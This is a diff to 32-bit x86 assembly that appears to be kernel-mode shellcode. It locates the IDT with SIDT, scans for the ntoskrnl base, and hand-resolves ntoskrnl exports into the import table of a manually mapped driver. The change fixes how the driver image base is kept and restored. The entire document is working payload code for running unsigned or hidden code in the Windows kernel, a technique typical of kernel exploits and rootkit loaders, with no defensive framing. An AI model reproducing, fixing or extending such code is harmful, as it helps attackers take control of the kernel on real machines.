@@ -11,7 +11,8 @@
 ;
 ; Register map (persistent):
 ;   EBP = ntoskrnl image base
-;   ECX = ntoskrnl export directory VA
+;   ECX = this driver's PE image base (needs saving around the inner resolve
+;         frame: ECX is scratch inside km_resolve)
 ;   EDX = "ntoskrnl" needle pointer (module-name gate)
 ;   EDI = current IMAGE_IMPORT_DESCRIPTOR pointer
 ;   ESI = current INT/FT walk pointer
@@ -55,9 +56,10 @@
 %define KM32_LOCAL_WANTED    0x08        ; [esp+0x08] = wanted import name VA
 %define KM32_LOCAL_EXPDIR    0x0C        ; [esp+0x0C] = ntoskrnl export dir VA
 %define KM32_LOCAL_SIZE      0x10
-%define KM32_SAVED_EBX       0x10        ; after SUB ESP: EBX/ESI/EDI pushed below
+%define KM32_SAVED_EBX       0x18        ; after SUB ESP: ECX/EBX/ESI/EDI pushed below
 %define KM32_SAVED_ESI       0x14
-%define KM32_SAVED_EDI       0x18
+%define KM32_SAVED_EDI       0x10
+%define KM32_SAVED_ECX       0x1C        ; driver image base, restored for km_desc_loop
 
     ; ---- 1. SIDT -> IDT base ----
     sub  esp, KM32_LOCAL_SIZE
@@ -126,6 +128,7 @@ km_img_scan:
     jnz  km_img_scan
 
     mov  edi, esi                        ; EDI = driver image base
+    mov  ecx, esi                        ; ECX = driver image base (persist for desc loop)
 
     mov  eax, dword [esi + E_LFANEW_OFFSET]
     add  eax, esi                        ; NT headers VA
@@ -139,8 +142,8 @@ km_desc_loop:
     mov  eax, dword [edi + DESC_DLL_NAME_RVA]
     test eax, eax
     jz   km_done                         ; null descriptor = end of table
-    mov  ebx, edi
-    add  ebx, eax                        ; EBX = DLL name VA (guard: NTOS only)
+    mov  ebx, ecx
+    add  ebx, eax                        ; EBX = DLL name VA (image base + RVA)
 
     ; module gate: first NTKRNL_PREFIX_LEN bytes == "ntoskrnl" (case-insens.),
     ; as two 4-byte compares with LOWERCASE_BLOCK as the lowercase mask. A NUL
@@ -158,16 +161,16 @@ km_desc_loop:
     mov  eax, dword [edi + DESC_INT_RVA]
     test eax, eax
     jz   km_use_ft
-    add  eax, edi                        ; EAX = INT VA
+    add  eax, ecx                        ; EAX = INT VA (image base + RVA)
     mov  esi, eax
     mov  eax, dword [edi + DESC_FT_RVA]
-    add  eax, edi                        ; EAX = IAT VA
+    add  eax, ecx                        ; EAX = IAT VA
     mov  ebx, eax
     jmp  km_thunk_loop
 
 km_use_ft:
     mov  eax, dword [edi + DESC_FT_RVA]
-    add  eax, edi
+    add  eax, ecx
     mov  esi, eax                        ; ESI = FT VA (names live in FT too)
     mov  ebx, eax                        ; EBX = IAT ptr (same address)
 
@@ -178,7 +181,7 @@ km_thunk_loop:
     js   km_by_ordinal                   ; bit 31 set = ordinal import
 
     ; import by name: EAX = RVA of IMAGE_IMPORT_BY_NAME
-    add  eax, edi
+    add  eax, ecx
     add  eax, IIBN_NAME_OFFSET           ; skip the hint WORD
     jmp  km_resolve                      ; EAX = wanted import name VA
 
@@ -189,6 +192,7 @@ km_by_ordinal:
 
     ; ---- 4. resolve EAX (NUL-terminated name) inside ntoskrnl exports ----
 km_resolve:
+    push ecx                             ; KM32_SAVED_ECX  (driver image base)
     push ebx                             ; KM32_SAVED_EBX  (IAT slot ptr)
     push esi                             ; KM32_SAVED_ESI  (thunk walk ptr)
     push edi                             ; KM32_SAVED_EDI  (desc ptr)
@@ -204,6 +208,7 @@ km_resolve:
     add  eax, ebp
     mov  dword [esp + KM32_LOCAL_EXPDIR], eax
     mov  edx, dword [eax + EXP_NUMNAMES_RVA]   ; idx counter = NumberOfNames
+    mov  dword [esp + KM32_LOCAL_IDX], edx
     mov  ecx, dword [eax + EXP_NAMES_RVA]
     add  ecx, ebp                              ; ECX = names array VA
     mov  dword [esp + KM32_LOCAL_NAMES], ecx
@@ -248,6 +253,7 @@ km_no_resolve:
     pop  edi
     pop  esi
     pop  ebx
+    pop  ecx                             ; restore driver image base
     jmp  km_thunk_next_skip
 
 km_thunk_next:
@@ -255,6 +261,7 @@ km_thunk_next:
     pop  edi
     pop  esi
     pop  ebx
+    pop  ecx                             ; restore driver image base
 
 km_thunk_next_skip:
     add  esi, THUNK_SIZE32
